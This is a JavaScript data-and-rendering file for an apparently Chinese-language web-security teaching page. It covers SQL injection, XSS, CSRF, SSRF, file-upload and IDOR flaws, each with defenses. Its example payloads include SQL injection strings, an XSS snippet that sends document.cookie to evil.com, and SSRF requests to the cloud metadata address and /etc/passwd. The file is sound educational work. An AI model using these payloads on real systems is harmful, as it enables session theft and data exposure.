/* ============================================================
   sec-notebook — 漏洞详情数据与渲染
   数据驱动生成 detail.html 的漏洞文章和侧边栏导航
   ============================================================ */
'use strict';

var RISK_MAP = {
  critical: { cls: 'risk-critical', label: '严重' },
  high:     { cls: 'risk-high', label: '高危' },
  medium:   { cls: 'risk-medium', label: '中危' },
  low:      { cls: 'risk-low', label: '低危' }
};

/* ===== 漏洞数据 ===== */
var VULNERABILITIES = [
  {
    id: 'sqli',
    icon: '🗄️',
    title: 'SQL 注入 (SQL Injection)',
    risk: 'critical',
    owasp: 'OWASP A03:2021',
    cwe: 'CWE-89',
    catBadge: 'badge-purple', category: '注入类',
    principle: '当应用程序将用户输入直接拼接到 SQL 查询语句中时，攻击者可以通过构造特殊的输入来改变 SQL 语句的语义，从而执行非预期的数据库操作。',
    terminal: {
      title: '攻击示例 — sql',
      html: '<div><span class="prompt">$</span> <span class="cmd"># 正常查询语句</span></div>'
          + '<div>SELECT * FROM users WHERE name = \'<span style="color:var(--color-accent-red);">admin</span>\'</div>'
          + '<div style="margin-top: 0.5rem;"><span class="prompt">$</span> <span class="cmd"># 攻击者输入: admin\'--</span></div>'
          + '<div>SELECT * FROM users WHERE name = \'<span style="color:var(--color-accent-red);">admin\'--</span>\'</div>'
          + '<div style="margin-top: 0.5rem; color: var(--color-accent-red);"># -- 是 SQL 注释符，后续的密码验证部分被注释掉了</div>'
          + '<div style="margin-top: 0.5rem;"><span class="prompt">$</span> <span class="cmd"># UNION 注入获取数据</span></div>'
          + '<div>SELECT * FROM users WHERE id = \'<span style="color:var(--color-accent-red);">1\' UNION SELECT username,password FROM users--</span>\'</div>'
    },
    attackTypes: [
      { title: '基于报错的注入', desc: '通过数据库错误信息推断表结构' },
      { title: '基于布尔的盲注', desc: '通过页面响应差异判断查询结果' },
      { title: '基于时间的盲注', desc: '通过响应延迟时间判断数据' },
      { title: 'UNION 联合查询', desc: '合并多个查询结果集获取数据' }
    ],
    defenses: [
      '<strong>参数化查询</strong>：使用 Prepared Statement，将 SQL 逻辑与数据分离',
      '<strong>ORM 框架</strong>：使用成熟的 ORM 自动处理查询参数化',
      '<strong>输入校验</strong>：对用户输入进行白名单验证',
      '<strong>最小权限</strong>：数据库账户使用最小必要权限',
      '<strong>WAF</strong>：部署 Web 应用防火墙进行规则过滤',
      '<strong>错误处理</strong>：不向用户展示详细的数据库错误信息'
    ]
  },
  {
    id: 'xss',
    icon: '💉',
    title: '跨站脚本 (XSS)',
    risk: 'high',
    owasp: 'OWASP A03:2021',
    cwe: 'CWE-79',
    catBadge: 'badge-purple', category: '客户端安全',
    principle: '攻击者将恶意 JavaScript 代码注入到网页中，当其他用户访问该页面时，脚本在受害者浏览器中执行。根据注入方式不同，分为反射型、存储型和 DOM 型三种。',
    terminal: {
      title: '攻击示例 — html',
      html: '<div><span class="prompt">$</span> <span class="cmd"># 反射型 XSS — URL 参数注入</span></div>'
          + '<div style="color:var(--color-accent-red);">https://example.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>'
          + '<div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># 存储型 XSS — 留言板注入</span></div>'
          + '<div style="color:var(--color-accent-red);">&lt;img src=x onerror="fetch(\'https://evil.com/?c=\'+document.cookie)"&gt;</div>'
          + '<div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># DOM 型 XSS — innerHTML 直接插入</span></div>'
          + '<div>document.getElementById(\'msg\').<span style="color:var(--color-accent-red);">innerHTML</span> = location.hash.slice(1);</div>'
    },
    defenses: [
      '<strong>输出编码</strong>：对插入 HTML 的数据进行实体编码',
      '<strong>CSP</strong>：配置 Content-Security-Policy 限制脚本来源',
      '<strong>HttpOnly Cookie</strong>：防止 JavaScript 读取敏感 Cookie',
      '<strong>避免危险 API</strong>：不使用 innerHTML/document.write/eval',
      '<strong>前端框架</strong>：Vue/React 默认会对插值进行转义'
    ]
  },
  {
    id: 'csrf',
    icon: '🎭',
    title: '跨站请求伪造 (CSRF)',
    risk: 'high',
    owasp: 'OWASP A01:2021',
    cwe: 'CWE-352',
    catBadge: 'badge-orange', category: '会话安全',
    principle: '攻击者诱导已登录用户访问恶意页面，利用浏览器自动携带 Cookie 的特性，向目标网站发送伪造请求，在用户不知情的情况下执行敏感操作（如修改密码、转账）。',
    defenses: [
      '<strong>Anti-CSRF Token</strong>：每个表单嵌入随机 Token，服务端校验',
      '<strong>SameSite Cookie</strong>：设置 SameSite=Strict/Lax 限制跨站发送',
      '<strong>Referer/Origin 校验</strong>：检查请求来源是否为可信域名',
      '<strong>二次验证</strong>：敏感操作要求输入密码或验证码',
      '<strong>自定义请求头</strong>：使用 X-Requested-With 等自定义 Header'
    ]
  },
  {
    id: 'ssrf',
    icon: '🔄',
    title: '服务端请求伪造 (SSRF)',
    risk: 'high',
    owasp: 'OWASP A10:2021',
    cwe: 'CWE-918',
    catBadge: 'badge-purple', category: '服务端安全',
    principle: '应用程序从用户输入中获取 URL 并发起请求，攻击者通过构造内网地址或特殊协议 URL，诱导服务器访问内部系统，绕过防火墙访问受保护的资源。',
    terminal: {
      title: '攻击示例 — bash',
      html: '<div><span class="prompt">$</span> <span class="cmd"># 读取云服务器元数据 (AWS)</span></div>'
          + '<div style="color:var(--color-accent-red);">http://169.254.169.254/latest/meta-data/</div>'
          + '<div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># 扫描内网端口</span></div>'
          + '<div style="color:var(--color-accent-red);">http://192.168.1.1:6379/ (Redis)</div>'
          + '<div style="margin-top: 0.8rem;"><span class="prompt">$</span> <span class="cmd"># 利用 file 协议读取文件</span></div>'
          + '<div style="color:var(--color-accent-red);">file:///etc/passwd</div>'
    },
    defenses: [
      '<strong>URL 白名单</strong>：仅允许访问预定义的域名或 IP 范围',
      '<strong>协议限制</strong>：仅允许 http/https 协议',
      '<strong>内网地址过滤</strong>：拒绝 127.0.0.1/8、10.0.0.0/8、172.16.0.0/12、192.168.0.0/16',
      '<strong>DNS 解析校验</strong>：解析后检查 IP 是否属于内网',
      '<strong>网络隔离</strong>：代理服务器与内网资源分离部署'
    ]
  },
  {
    id: 'file-upload',
    icon: '📤',
    title: '文件上传漏洞',
    risk: 'critical',
    owasp: 'OWASP A04:2021',
    cwe: 'CWE-434',
    catBadge: 'badge-red', category: '文件安全',
    principle: '应用程序未对上传文件进行充分的类型、扩展名和内容校验，攻击者可上传包含恶意代码的文件（如 PHP WebShell），在服务器端执行任意命令。',
    defenses: [
      '<strong>文件类型白名单</strong>：只允许指定的文件扩展名和 MIME 类型',
      '<strong>内容检测</strong>：检测文件 Magic Number (文件头) 而非仅依赖扩展名',
      '<strong>文件重命名</strong>：使用随机生成的文件名，避免保留原始扩展名',
      '<strong>存储隔离</strong>：上传目录与执行目录分离，禁止在上传目录执行脚本',
      '<strong>权限控制</strong>：上传目录设置最小权限，禁用脚本执行引擎',
      '<strong>病毒扫描</strong>：集成 ClamAV 等工具扫描恶意文件'
    ]
  },
  {
    id: 'idor',
    icon: '🔑',
    title: '不安全的直接对象引用 (IDOR)',
    risk: 'medium',
    owasp: 'OWASP A01:2021',
    cwe: 'CWE-639',
    catBadge: 'badge-orange', category: '权限问题',
    principle: '应用程序使用用户提供的标识符（如 ID 号）直接访问后端对象，但未验证当前用户是否拥有对该对象的访问权限，导致越权访问。',
    defenses: [
      '<strong>服务端权限校验</strong>：每次访问对象时验证当前用户身份与权限',
      '<strong>使用 UUID/GUID</strong>：使用不可预测的随机标识符替代自增 ID',
      '<strong>间接引用映射</strong>：使用 Session 级别的对象引用映射表',
      '<strong>最小权限原则</strong>：用户只能访问自己拥有的资源'
    ]
  }
];

/* ===== DOM 渲染 ===== */

function makeEl(tag, attrs, children) {
  const el = document.createElement(tag);
  if (attrs) {
    for (const key in attrs) {
      if (key === 'className') { el.className = attrs[key]; }
      else if (key === 'innerHTML') { el.innerHTML = attrs[key]; }
      else { el.setAttribute(key, attrs[key]); }
    }
  }
  if (children) {
    (Array.isArray(children) ? children : [children]).forEach(function (c) {
      el.appendChild(typeof c === 'string' ? document.createTextNode(c) : c);
    });
  }
  return el;
}

function renderSidebarNav(vulns) {
  const nav = document.getElementById('vuln-sidebar-nav');
  if (!nav) { return; }
  vulns.forEach(function (v, i) {
    const color = i === 0 ? 'var(--color-accent)' : 'var(--color-text-tertiary)';
    nav.appendChild(makeEl('a', {
      href: '#' + v.id,
      style: 'color: ' + color + '; font-size: 0.9rem;'
    }, v.title));
  });
}

function renderVulnDetail(containerId) {
  const container = document.getElementById(containerId);
  if (!container) { return; }

  VULNERABILITIES.forEach(function (v) {
    const risk = RISK_MAP[v.risk];

    // 文章容器
    const article = makeEl('article', { id: v.id, className: 'card card-glow-cyan detail-article' });

    // 标题行
    const headerRow = makeEl('div', { className: 'flex-between', style: 'margin-bottom: 1rem; flex-wrap: wrap; gap: 0.5rem;' });
    headerRow.appendChild(makeEl('h2', null, v.icon + ' ' + v.title));
    headerRow.appendChild(makeEl('span', { className: 'badge ' + risk.cls }, risk.label));
    article.appendChild(headerRow);

    // 徽章行
    const badgeRow = makeEl('div', { className: 'badge-row' });
    badgeRow.appendChild(makeEl('span', { className: 'badge badge-cyan' }, v.owasp));
    badgeRow.appendChild(makeEl('span', { className: 'badge badge-blue' }, v.cwe));
    badgeRow.appendChild(makeEl('span', { className: 'badge ' + v.catBadge }, v.category));
    article.appendChild(badgeRow);

    // 原理
    article.appendChild(makeEl('h3', null, '漏洞原理'));
    article.appendChild(makeEl('p', null, v.principle));

    // 终端示例（可选）
    if (v.terminal) {
      const termBox = makeEl('div', { className: 'terminal-box terminal-box--spaced' });
      const termHeader = makeEl('div', { className: 'terminal-header' });
      termHeader.appendChild(makeEl('span', { className: 'terminal-dot terminal-dot--red' }));
      termHeader.appendChild(makeEl('span', { className: 'terminal-dot terminal-dot--yellow' }));
      termHeader.appendChild(makeEl('span', { className: 'terminal-dot terminal-dot--green' }));
      termHeader.appendChild(makeEl('span', { className: 'terminal-title' }, v.terminal.title));
      termBox.appendChild(termHeader);
      const termBody = makeEl('div', { className: 'terminal-body', innerHTML: v.terminal.html });
      termBox.appendChild(termBody);
      article.appendChild(termBox);
    }

    // 攻击类型网格（可选）
    if (v.attackTypes && v.attackTypes.length) {
      article.appendChild(makeEl('h3', null, '攻击类型'));
      const grid = makeEl('div', { className: 'grid grid-2 attack-types-grid' });
      v.attackTypes.forEach(function (at) {
        const card = makeEl('div', { className: 'card card-glass card-compact' });
        card.appendChild(makeEl('strong', null, at.title));
        card.appendChild(makeEl('p', null, at.desc));
        grid.appendChild(card);
      });
      article.appendChild(grid);
    }

    // 防御方案
    article.appendChild(makeEl('h3', null, '防御方案'));
    const ul = makeEl('ul', { className: 'defense-list' });
    v.defenses.forEach(function (d) {
      ul.appendChild(makeEl('li', { innerHTML: d }));
    });
    article.appendChild(ul);

    container.appendChild(article);
  });
}
